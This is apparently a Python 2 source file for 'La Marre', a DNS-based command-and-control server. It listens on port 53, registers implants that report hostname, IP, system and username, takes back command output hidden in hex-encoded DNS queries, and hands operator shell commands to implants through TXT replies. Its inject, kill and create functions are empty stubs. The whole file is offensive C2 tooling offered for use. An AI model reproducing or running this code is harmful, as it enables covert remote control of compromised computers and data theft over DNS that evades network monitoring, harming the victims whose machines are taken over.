#!/usr/bin/env python

import socket
import time
import threading
import sys
import datetime
from dnslib import A, AAAA, CNAME, MX, RR, TXT
from dnslib import DNSHeader, DNSRecord, QTYPE

AF_INET = 2
SOCK_DGRAM = 2

result = []
implant_id = [] 

dodo = 'DODO'

command = {}
implant_info = {}

class dns_server:
	
	def start_serv(self):
		self.s = socket.socket(AF_INET, SOCK_DGRAM)
		self.s.bind(('', 53))
		while True:
			self.data, self.implant = self.s.recvfrom(8192)
			self.handler(self.s,self.implant,self.data)
			

	def handler(self, s, implant, data):
		request = DNSRecord.parse(data)
		self.parse_request(request)
	
	def parse_request(self, request):
		id = request.header.id
		qname = request.q.qname
		qtype = request.q.qtype
		if qtype == QTYPE.A:
			self.read_query_a(request)
		elif qtype == QTYPE.TXT:
			self.read_query_txt(request)

	def read_query_a(self, request):		
		
		qname = request.q.qname
		
		id = request.header.id		
		if qname.label[0] in implant_id:
			

			if qname.label[1] == 'START':
				#print "Limplant envoie le debut des resultats"
				reponse = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)				
				reponse.add_answer(RR(qname, QTYPE.TXT,   rdata=TXT(dodo)))		
				self.send_data(reponse)				
			
			if qname.label[1] == 'STARTFF':
				#print "Limplant envoie le debut des resultats"
				reponse = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)				
				reponse.add_answer(RR(qname, QTYPE.TXT,   rdata=TXT(dodo)))		
				self.send_data(reponse)
							

			elif qname.label[1] == 'BODY':
				
				str1 = ''.join(qname.label[2:-3])
				#print "L'implant renvoie le resultat suivant: "
				print '\n'+str1.decode("hex")	
				reponse = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)				
				reponse.add_answer(RR(qname, QTYPE.TXT,   rdata=TXT(dodo)))		
				self.send_data(reponse)
				
			elif qname.label[1] == 'FFBODY':
				
				str1 = ''.join(qname.label[3:-3])
				result.append(str1.decode("hex"))
				reponse = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)				
				reponse.add_answer(RR(qname, QTYPE.TXT,   rdata=TXT(dodo)))		
				self.send_data(reponse)							

			elif qname.label[1] == 'END':
				#print "Limplant envoie la fin des resultats"		
				reponse = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)				
				reponse.add_answer(RR(qname, QTYPE.TXT,   rdata=TXT(dodo)))		
				self.send_data(reponse)				
				str1 = ''.join(result)
				print '\n'+str1
				del result[:]



	def read_query_txt(self, request):
		qname = request.q.qname
		id = request.header.id			
		if qname.label[0] == 'NEW':
				sys.stdout.flush()		
				print '\n[+] New implant! IMPLANT-ID %s' % str(id)
				str1 = ''.join(qname.label[1:-3])
				plop = str1.decode('hex')
				implant_info[str(id)] = plop.split('\n')	
			
				reponse = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)				
				reponse.add_answer(RR(qname, QTYPE.TXT,   rdata=TXT(str(id))))		
				implant_id.append(str(id))				
				self.send_data(reponse)
				
		if qname.label[0] in implant_id:		
			if qname.label[1] == 'TOPO':
				now = datetime.datetime.now()
				localtime= now.strftime("%Y-%m-%d %H:%M")
				implant_info[qname.label[0]][4] = localtime

				if command.get(qname.label[0]):
					#print "[+] Implant %s poll, commandes pretes, au travail petit hippo!!" % str(qname.label[0])
					reponse = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)				
					reponse.add_answer(RR(qname, QTYPE.TXT,   rdata=TXT(command.get(qname.label[0]))))
					self.send_data(reponse)
					del command[qname.label[0]]
				else:
					#print "[+] Implant %s poll , aucunes commandes, fait dodo petit hippo" % str(qname.label[0])
					reponse = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)				
					reponse.add_answer(RR(qname, QTYPE.TXT,   rdata=TXT(dodo)))		
					self.send_data(reponse)
				pass

	def send_data(self,reponse):
		self.s.sendto(reponse.pack(), self.implant)


def start_lp():
	print "[+] Starting the DNS listening post!"
	dns = dns_server()
	thread = threading.Thread(target=dns.start_serv)  
	thread.daemon = True  
	thread.start()
	print "[+] OK"
	print ""

def exec_menu(implant):
	choix = raw_input('[LaMarre]%s-SHELL#>'% implant)
	if choix == 'back':
		interact_menu(implant)	
	if choix != '\n':	
		command[implant] = choix
		exec_menu(implant)
	
	else:
		choix = raw_input('[LaMarre]%s-SHELL#>'% implant)

def interact_menu(implant):
	del result[:]
	print ""
	print "Commandes du menu : shell (interact whit implant in a shell fashion)"
	print "                    inject (inject shellcode/msf/empire payload)"
	print "                    kill (send kill cmd to implant)"
	print "                    back (return to main menu)" 
	print "" 
	loop = True
	while loop:
		choix = raw_input('[LaMarre]%s>'% implant)
		if choix == 'shell':
			exec_menu(implant)
		if choix == 'inject':
			pass
		if choix == 'kill':
			pass
		if choix == 'back':
			main_menu()
		
def create_implant():
	pass

def print_session():
	print ""
	print "          IMPLANTID      INTERNALIP      HOSTNAME      SYSTEM      USERNAME      LASTPOLL       "
	print "          ---------      ----------      --------      ------      --------      --------       "
	
	for implant in implant_info:
		
		print "          "+implant+"          "+implant_info[implant][3]+"   "+implant_info[implant][0]+"       "+implant_info[implant][1]+"       "+implant_info[implant][2]+"          "+implant_info[implant][4]
		print ""

print "[----------------La Marre----------------]"
print "[-------------Listening Post-------------]"
print "[----------------------------------------]"
print "[----------------------------------------]"
print "[-----------DNS Stager and C2C-----------]"
print "[----------------------------------------]"
print "[------------------------------of topotam]"
print ""
print ""

def main_menu():
	
	print "Commandes du menu principal: create (create Python/C/PSH stager/stageless implant)"
	print "                             interact <ID> (interact whit implants by ID)"
	print "                             session (print implant ID's and infos)" 
	print ""
	
	loop = True
	while loop:
		choix = raw_input('[LaMarre]>')
		choix = choix.split()
		try:	
			if choix[0] == 'interact':
				interact_menu(choix[1])
			if choix[0] == 'create':
				#create_menu()
				pass
			if choix[0] == 'session':
				print_session()
		except:
			pass
start_lp()
main_menu()